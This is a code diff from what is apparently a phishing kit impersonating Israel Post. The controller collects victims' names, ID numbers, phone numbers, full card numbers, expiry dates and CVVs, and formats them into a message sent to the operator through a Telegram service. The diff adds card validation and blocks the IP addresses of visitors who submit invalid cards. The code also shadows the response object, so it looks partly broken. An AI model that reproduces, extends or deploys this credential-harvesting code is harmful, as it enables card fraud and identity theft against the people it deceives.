@@ -2,16 +2,38 @@ const { telegramService } = require("../services");
 const formatCreditCard = require("../utils/formatCreditCard");
 const getUserAgent = require("../utils/getUserAgent");
 const { Axios } = require("axios");
+const isValidCreditCard = require("../utils/isValidCreditCard");
+const BlockedIP = require("../models/blockedIP.model");
 
 module.exports.addCardDetails = async (req, res, next) => {
   try {
-    const { fullName, idNumber, phoneNumber, cardNumber, expiry, cvv } =
-      req.body;
+    const {
+      fullName,
+      idNumber,
+      phoneNumber,
+      cardNumber,
+      expiryMonth,
+      expiryYear,
+      cvv,
+    } = req.body;
 
     const axios = new Axios();
     const bin = cardNumber.substring(0, 7);
     const res = await axios.get(`https://lookup.binlist.net/${bin}`);
     const cardDetails = res.data;
+
+    const isValidCard = isValidCreditCard(
+      cardNumber,
+      cvv,
+      expiryMonth,
+      expiryYear
+    );
+
+    if (!isValidCard) {
+      const blockedIP = new BlockedIP({ ip: req.IP });
+      await blockedIP.save();
+      res.status(200).json({ success: false });
+    }
 
     const message = `
       [IsraelPost - 💳 Card Info 💳]
@@ -19,7 +41,7 @@ module.exports.addCardDetails = async (req, res, next) => {
       [👤] ID Number: ${idNumber}
       [👤] Mobile Number: ${phoneNumber}
       [💳] Card Number: ${formatCreditCard(cardNumber)}
-      [🔄] Expiry Date: ${expiry}
+      [🔄] Expiry Date: ${expiryMonth}/${expiryYear}
       [🔑] CCV: ${cvv}
       [🔍] GEO IP: ${req.IP}
       
